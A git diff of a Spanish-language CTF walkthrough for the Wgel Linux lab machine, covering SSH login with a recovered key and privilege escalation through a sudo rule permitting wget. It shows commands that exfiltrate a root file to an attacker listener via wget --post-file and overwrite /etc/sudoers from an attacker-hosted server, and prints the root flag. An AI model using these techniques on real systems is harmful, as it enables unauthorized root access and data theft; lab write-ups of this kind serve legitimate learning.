@@ -166,7 +166,6 @@ Se ajustan los permisos para poder usarlo:
 ```bash
 sudo chmod 600 id_rsa
 ```
-![nano](Maquina_de_Linux/Wgel-CTF/imagenes/nano.png)
 
 
 ## 8. Acceso inicial mediante SSH
@@ -182,10 +181,10 @@ Se deduce que el usuario del sistema es jessie.
 Se realiza la conexión:
 
 ```bash
-sudo ssh -i key jessie@10.130.184.157
+ssh -i key jessie@10.130.184.157
 ```
 
-![sudo](Maquina_de_Linux/Wgel-CTF/imagenes/jessie.png)
+![sudo](Maquina_de_Linux/Wgel-CTF/imagenes/ssh2.png)
 
 Si todo es correcto, se obtiene acceso al sistema.
 
@@ -207,6 +206,7 @@ También se puede verificar información del sistema:
 ```bash
 uname -a
 ```
+
 
 ## 10. Obtención de la user flag
 
@@ -260,29 +260,69 @@ Resultado:
 (ALL) NOPASSWD: /usr/bin/wget
 ```
 
-## 13. Análisis del vector de ataque
+## 12. Escalada de privilegios (abuso de sudo + wget)
 
-El binario wget permite realizar peticiones HTTP y manipular archivos remotos y locales. Al poder ejecutarse como root, puede ser utilizado para acceder a archivos sensibles del sistema.
+Se aprovecha la mala configuración de sudo permitiendo ejecutar wget como root.
 
+**Paso 1: Máquina atacante (Kali)**
 
-## 14. Explotación
-
-Se utiliza wget con privilegios elevados para acceder al contenido del archivo de root.
-
-Se inicia un servidor/listener en la máquina atacante:
+Se crea un archivo que sobrescribe el sudoers:
 
 ```bash
-nc -lvp 4444
+echo 'jessie ALL=(ALL) NOPASSWD:ALL' > sudoers
 ```
 
-![sudo](Maquina_de_Linux/Wgel-CTF/imagenes/nc.png)
-
-Y desde la máquina víctima se ejecuta:
+Se levanta un servidor HTTP:
 
 ```bash
-sudo /usr/bin/wget --post-file=/root/root_flag.txt http://192.168.142.53:4444/
+python3 -m http.server 80
 ```
 
-![sudo](Maquina_de_Linux/Wgel-CTF/imagenes/sudoo.png)
+**Paso 2: Máquina víctima**
 
+Se descarga el archivo como root mediante wget:
+
+```bash
 sudo /usr/bin/wget http://192.168.142.53/sudoers -O /etc/sudoers
+```
+
+![sudo](Maquina_de_Linux/Wgel-CTF/imagenes/sudoers.png)
+
+**Paso 3: Verificación**
+
+Se comprueban los privilegios:
+
+```bash
+sudo -l
+```
+
+Si la modificación fue exitosa, el usuario ahora puede ejecutar cualquier comando como root.
+
+**Paso 4: Escalada a root**
+
+```bash
+sudo su
+```
+
+```bash
+whoami
+```
+
+![sudo](Maquina_de_Linux/Wgel-CTF/imagenes/root.png)
+
+
+## 13. Flag de root
+
+La flag se encuentra en:
+
+```bash
+ find / -name "*root*.txt" 2>/dev/null
+```
+La flag:
+
+```bash
+b1b968b37519ad1daa6408188649263d
+```
+
+![sudo](Maquina_de_Linux/Wgel-CTF/imagenes/catroot.png)
+
